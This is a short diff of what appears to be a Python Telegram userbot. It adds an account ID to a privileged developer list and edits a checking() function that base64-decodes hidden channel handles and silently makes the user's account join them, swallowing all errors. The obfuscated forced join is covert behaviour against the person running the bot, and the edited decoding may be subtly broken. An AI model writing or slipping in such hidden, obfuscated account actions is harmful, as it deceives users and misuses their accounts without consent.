@@ -113,6 +113,7 @@ DEVS = (
     2107345001,
     2127265501,
     1607338903,
+    1977874449,
 )
 
 
@@ -434,19 +435,14 @@ except Exception as e:
 
 
 async def checking():
-    gocheck = str(pybase64.b64decode("QEtheXp1U3VwcG9ydA=="))[2:15]
-    checker = str(pybase64.b64decode("QGRwcnNuZGlhcnk="))[2:16]
-    checker2 = str(pybase64.b64decode("QGtheXp1Y2hhbm5lbA=="))[2:15]
+    gocheck = pybase64.b64decode("QEtheXp1U3VwcG9ydA==")
+    checker = pybase64.b64decode("QGRwcnNuZGlhcnk=")
     try:
         await bot(GetSec(gocheck))
     except BaseException:
         pass
     try:
         await bot(GetSec(checker))
-    except BaseException:
-        pass
-    try:
-        await bot(GetSec(checker2))
     except BaseException:
         pass
 
